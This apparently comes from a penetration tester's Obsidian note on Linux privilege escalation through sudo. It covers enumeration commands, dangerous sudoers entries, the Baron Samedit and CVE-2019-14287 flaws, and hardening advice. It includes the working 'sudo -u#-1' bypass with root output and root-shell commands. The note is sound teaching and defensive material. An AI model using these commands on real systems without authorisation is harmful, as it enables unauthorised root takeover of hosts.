# Linux Privilege Escalation – Sudo

## Overview

`sudo` is used on UNIX-like systems such as Linux and macOS to run commands as another user, most commonly **root**. It provides controlled privilege delegation without requiring a full switch to the target account.

Permissions are primarily defined in:

```text
/etc/sudoers
/etc/sudoers.d/
```

Typical use cases include:

- administrative commands
- service management
- package installation
- controlled delegation of specific binaries

Because `sudo` sits directly between a low-privileged user and root-level execution, it is always a high-value enumeration target during privilege escalation.

---

# Why Sudo Matters

Misconfigured `sudo` rules can lead to:

- direct root access
- command execution as another user
- environment-variable abuse
- policy bypasses
- exploitation of vulnerable `sudo` versions

When enumerating a host, `sudo` is often one of the first places to check because it can produce a fast and reliable privilege escalation path.

---

# Key Files

## Main configuration

```text
/etc/sudoers
```

## Included policy directory

```text
/etc/sudoers.d/
```

---

# Viewing Sudo Rules

If we have the password, we can inspect effective entries:

```bash
sudo cat /etc/sudoers | grep -v "#" | sed -r '/^\s*$/d'
```

Example output:

```text
Defaults        env_reset
Defaults        mail_badpass
Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"
Defaults        use_pty
root            ALL=(ALL:ALL) ALL
%admin          ALL=(ALL) ALL
%sudo           ALL=(ALL:ALL) ALL
cry0l1t3        ALL=(ALL) /usr/bin/id
@includedir     /etc/sudoers.d
```

This tells us:

- defaults are set
- the `sudo` group has broad rights
- `cry0l1t3` may run `/usr/bin/id`
- additional rules may exist in `/etc/sudoers.d`

---

# First Enumeration Step

Always start with:

```bash
sudo -l
```

This lists commands the current user may run via `sudo`.

Example:

```text
User cry0l1t3 may run the following commands on Penny:
    ALL=(ALL) /usr/bin/id
```

This is one of the most important privilege escalation checks on Linux.

---

# What to Look For

When reviewing `sudo -l`, pay close attention to:

- `NOPASSWD`
- `SETENV`
- commands run as `root`
- commands run as **any** user
- wildcards
- scripting languages
- editors
- interpreters
- service management binaries
- archivers
- file read/write utilities
- networking tools
- package managers

Examples of especially interesting entries:

```text
(root) NOPASSWD: /usr/bin/python3
(root) NOPASSWD: /usr/bin/vim
(root) NOPASSWD: /usr/bin/find
(root) NOPASSWD: /usr/bin/tar
(root) NOPASSWD: /usr/bin/less
(root) NOPASSWD: /usr/bin/systemctl
(root) NOPASSWD: /usr/bin/awk
```

These are often exploitable through **GTFOBins** techniques.

---

# Check the Sudo Version

Before focusing only on misconfiguration, identify the installed version:

```bash
sudo -V | head -n1
```

Example:

```text
Sudo version 1.8.31
```

Older vulnerable versions may allow privilege escalation through known CVEs.

---

# Vulnerability 1 – CVE-2021-3156 (Baron Samedit)

## Summary

CVE-2021-3156 is a **heap-based buffer overflow** in `sudo` discovered in 2021. It was especially notable because it had existed for many years before public disclosure.

This vulnerability affected many distributions, including versions such as:

- `1.8.31` on Ubuntu 20.04
- `1.8.27` on Debian 10
- `1.9.2` on Fedora 33

---

## Why It Matters

If the host is running a vulnerable build of `sudo`, privilege escalation to root may be possible even without a dangerous `sudoers` rule.

---

## Confirm Version

```bash
sudo -V | head -n1
```

Example:

```text
Sudo version 1.8.31
```

---

## Identify OS Version

```bash
cat /etc/lsb-release
```

Example:

```text
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=20.04
DISTRIB_CODENAME=focal
DISTRIB_DESCRIPTION="Ubuntu 20.04.1 LTS"
```

This matters because public PoCs often require selecting a target profile matching both:

- OS version
- libc version
- sudo build

---

## Key Point

If the host is vulnerable:

- local privilege escalation may be possible
- this does **not** depend on having broad `sudoers` rights
- reliable exploitation often depends on exact target matching

---

## Operational Note

Because this is memory corruption in a security-critical binary:

- unstable PoCs may crash `sudo`
- exploit success can vary by environment
- always verify exact version and build context

---

# Vulnerability 2 – CVE-2019-14287 (Sudo Policy Bypass)

## Summary

CVE-2019-14287 is a **sudo policy bypass** affecting versions **below 1.8.28**.

It abuses how `sudo` handles user ID `-1`.

Under vulnerable conditions:

```bash
sudo -u#-1 <command>
```

may resolve to UID `0`, which is **root**.

---

## Prerequisite

This requires a `sudoers` rule that permits executing commands as arbitrary users.

For example:

```text
(ALL) /usr/bin/id
```

or similar broad target-user rules.

It is **not** enough to simply have `sudo` installed.

---

## Example Enumeration

```bash
sudo -l
```

Example:

```text
User cry0l1t3 may run the following commands on Penny:
    ALL=(ALL) /usr/bin/id
```

This tells us the command may be run as **any** user.

---

## Check Current User ID

```bash
cat /etc/passwd | grep cry0l1t3
```

Example:

```text
cry0l1t3:x:1005:1005:cry0l1t3,,,:/home/cry0l1t3:/bin/bash
```

Normally this would just confirm the user’s identity, but in this vulnerability the interesting part is that `sudo` improperly handles `-1`.

---

## Vulnerable Behavior

On affected versions, invoking:

```bash
sudo -u#-1 id
```

may execute the command as root.

Example result:

```text
uid=0(root) gid=1005(cry0l1t3) groups=1005(cry0l1t3)
```

This is an immediate privilege escalation.

---

# Sudo Misconfiguration vs Sudo Vulnerability

These are two separate privilege escalation paths:

## Misconfiguration
The `sudoers` policy itself is too permissive.

Examples:

- `NOPASSWD: ALL`
- root-capable GTFOBins
- `SETENV`
- overly broad wildcards

## Vulnerability
The installed `sudo` binary is itself flawed.

Examples:

- CVE-2021-3156
- CVE-2019-14287

A host can be:

- misconfigured but fully patched
- well-configured but vulnerable
- both vulnerable and misconfigured

---

# High-Value Sudo Findings

## 1. Full root access

```text
(root) NOPASSWD: ALL
```

This is usually game over:

```bash
sudo su
```

or

```bash
sudo /bin/bash
```

---

## 2. Arbitrary interpreters

Examples:

```text
/usr/bin/python3
/usr/bin/perl
/usr/bin/ruby
/usr/bin/bash
/usr/bin/sh
```

These often allow a shell via GTFOBins.

---

## 3. File editors and pagers

Examples:

```text
/usr/bin/vim
/usr/bin/nano
/usr/bin/less
/usr/bin/more
```

These may allow shell escapes or file overwrite abuse.

---

## 4. File/archive tools

Examples:

```text
/usr/bin/tar
/usr/bin/zip
/usr/bin/cp
/usr/bin/rsync
```

Can often be abused to read/write privileged files.

---

## 5. Service management tools

Examples:

```text
/usr/bin/systemctl
/usr/sbin/service
```

Can lead to arbitrary command execution if units can be created or modified.

---

## 6. Environment preservation

Example:

```text
SETENV
env_keep+=LD_PRELOAD
```

These are especially valuable because they may enable:

- `LD_PRELOAD` abuse
- `PYTHONPATH` hijacking
- custom library injection

---

# Good Enumeration Workflow

## 1. List sudo permissions

```bash
sudo -l
```

---

## 2. Identify version

```bash
sudo -V | head -n1
```

---

## 3. Check OS version

```bash
cat /etc/os-release
cat /etc/lsb-release
```

---

## 4. Review full sudoers if accessible

```bash
sudo cat /etc/sudoers
sudo ls -la /etc/sudoers.d/
```

---

## 5. Compare commands against GTFOBins

Look up every permitted binary at:

```text
https://gtfobins.github.io/
```

---

## 6. Check for vulnerable sudo builds

Especially if:

- version is old
- host is legacy
- patching appears inconsistent

---

# Useful Commands

## Show allowed sudo commands

```bash
sudo -l
```

## Show sudo version

```bash
sudo -V | head -n1
```

## Show operating system version

```bash
cat /etc/lsb-release
```

## Read sudoers if permitted

```bash
sudo cat /etc/sudoers
```

## List extra sudo policy files

```bash
ls -la /etc/sudoers.d/
```

## Get user entry from passwd

```bash
cat /etc/passwd | grep <username>
```

---

# Defensive Notes

From a hardening perspective:

- keep `sudo` updated
- avoid broad `ALL=(ALL)` rules where unnecessary
- avoid `NOPASSWD` unless absolutely required
- use absolute paths
- restrict commands tightly
- avoid dangerous binaries in sudoers
- avoid `SETENV` unless required
- review `/etc/sudoers.d/` regularly
- test delegation against GTFOBins-style escapes

---

# Quick Cheatsheet

## Enumerate sudo

```bash
sudo -l
sudo -V | head -n1
```

## Inspect OS version

```bash
cat /etc/lsb-release
cat /etc/os-release
```

## Interesting findings

```text
NOPASSWD
SETENV
ALL=(ALL)
interpreters
editors
GTFOBins
older sudo versions
```

## Relevant CVEs

```text
CVE-2021-3156  -> heap overflow in sudo
CVE-2019-14287 -> policy bypass using -u#-1
```

---

# Key Takeaways

- `sudo` is one of the first privilege escalation surfaces to inspect on Linux
- `sudo -l` is mandatory during enumeration
- both **misconfiguration** and **binary vulnerabilities** matter
- older `sudo` versions may be exploitable even when rules look narrow
- CVE-2021-3156 and CVE-2019-14287 are two of the most important historical sudo privilege escalation issues
- GTFOBins knowledge makes `sudo` abuse much faster to recognize
- environment-preserving rules like `SETENV` can be as dangerous as broad root access
- always enumerate `/etc/sudoers` and `/etc/sudoers.d/` when possible

---

# Tags

#linux
#privilege-escalation
#sudo
#sudoers
#cve-2021-3156
#cve-2019-14287
#gtfobins
#enumeration
#post-exploitation
#obsidian